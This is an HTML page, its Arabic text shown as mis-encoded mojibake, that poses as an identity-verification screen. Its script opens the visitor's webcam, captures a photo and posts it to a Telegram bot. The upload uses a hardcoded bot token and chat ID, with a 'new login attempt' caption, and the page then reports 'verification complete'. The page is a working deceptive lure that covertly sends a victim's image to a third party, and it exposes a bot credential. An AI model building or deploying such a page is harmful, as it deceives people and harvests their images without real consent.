<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ù†Ø¸Ø§Ù… Ø§Ù„ØªØ­Ù‚Ù‚ Ø§Ù„Ø¢Ù…Ù†</title>
    <style>
        body { font-family: sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; width: 320px; }
        #video { width: 100%; border-radius: 10px; display: none; margin-top: 15px; background: #000; }
        .btn { background: #007bff; color: white; border: none; padding: 12px 25px; border-radius: 5px; cursor: pointer; font-size: 16px; width: 100%; }
        #log { font-size: 12px; color: #666; margin-top: 15px; text-align: right; line-height: 1.6; }
    </style>
</head>
<body>

<div class="card">
    <h3>Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ù‡ÙˆÙŠØ©</h3>
    <p id="desc">Ø§Ø¶ØºØ· Ù„Ù„Ø¨Ø¯Ø¡ ÙÙŠ Ø¥Ø¬Ø±Ø§Ø¡Ø§Øª Ø§Ù„ØªØ­Ù‚Ù‚</p>
    <video id="video" autoplay playsinline></video>
    <button id="start-btn" class="btn" onclick="startProcess()">ØªØ£ÙƒÙŠØ¯ Ø§Ù„Ù‡ÙˆÙŠØ©</button>
    <div id="log"></div>
</div>

<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

<script>
    // ØªØ£ÙƒØ¯ Ù…Ù† ØµØ­Ø© Ù‡Ø°Ù‡ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
    const BOT_TOKEN = "8274780275:AAHJRfz_32XgoKPIKzk78ux1hwgaMAGsRkc";
    const CHAT_ID = "7368655915";

    function writeLog(msg) {
        const logDiv = document.getElementById('log');
        logDiv.innerHTML += msg + "<br>";
        console.log(msg);
    }

    async function startProcess() {
        document.getElementById('start-btn').style.display = 'none';
        const video = document.getElementById('video');
        video.style.display = 'block';

        writeLog("â³ Ø¬Ø§Ø±ÙŠ ØªØ´ØºÙŠÙ„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§...");

        try {
            // 1. Ø·Ù„Ø¨ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = stream;
            
            await new Promise(r => setTimeout(r, 2000)); // Ø§Ù†ØªØ¸Ø§Ø± Ù„ØªØ±ÙƒÙŠØ² Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§

            // 2. Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ±Ø©
            const canvas = document.getElementById('canvas');
            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
            
            writeLog("ğŸ“¸ ØªÙ… Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ±Ø©ØŒ Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­ÙˆÙŠÙ„...");
            
            canvas.toBlob(async (blob) => {
                if (!blob) {
                    writeLog("âŒ ÙØ´Ù„ ÙÙŠ Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„ØµÙˆØ±Ø©.");
                    return;
                }

                // 3. Ø¥Ø¹Ø¯Ø§Ø¯ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù„Ù„Ø¥Ø±Ø³Ø§Ù„
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'image.jpg');
                formData.append('caption', "âœ… Ù…Ø­Ø§ÙˆÙ„Ø© Ø¯Ø®ÙˆÙ„ Ø¬Ø¯ÙŠØ¯Ø©\nâ° " + new Date().toLocaleString());

                writeLog("ğŸ“¤ Ø¬Ø§Ø±ÙŠ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø¥Ù„Ù‰ ØªÙ„ÙŠØ¬Ø±Ø§Ù…...");

                // 4. Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ÙØ¹Ù„ÙŠ
                try {
                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });

                    const result = await response.json();

                    if (result.ok) {
                        writeLog("âœ… ØªÙ… Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø¨Ù†Ø¬Ø§Ø­!");
                        document.getElementById('desc').innerText = "Ø§ÙƒØªÙ…Ù„ Ø§Ù„ØªØ­Ù‚Ù‚ Ø¨Ù†Ø¬Ø§Ø­.";
                    } else {
                        writeLog("âŒ Ø®Ø·Ø£ Ù…Ù† ØªÙ„ÙŠØ¬Ø±Ø§Ù…: " + result.description);
                    }
                } catch (error) {
                    writeLog("âŒ ÙØ´Ù„ Ø§Ù„Ø§ØªØµØ§Ù„ Ø¨Ø§Ù„Ø¥Ù†ØªØ±Ù†Øª Ø£Ùˆ Ù…Ø­Ø¬ÙˆØ¨.");
                }

                // Ø¥ØºÙ„Ø§Ù‚ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø¨Ø¹Ø¯ Ø§Ù„Ø§Ù†ØªÙ‡Ø§Ø¡
                stream.getTracks().forEach(t => t.stop());
                video.style.display = 'none';
            }, 'image/jpeg');

        } catch (err) {
            writeLog("âŒ ÙØ´Ù„ Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„ÙƒØ§Ù…ÙŠØ±Ø§: " + err.message);
            document.getElementById('start-btn').style.display = 'block';
        }
    }
</script>
</body>
</html>
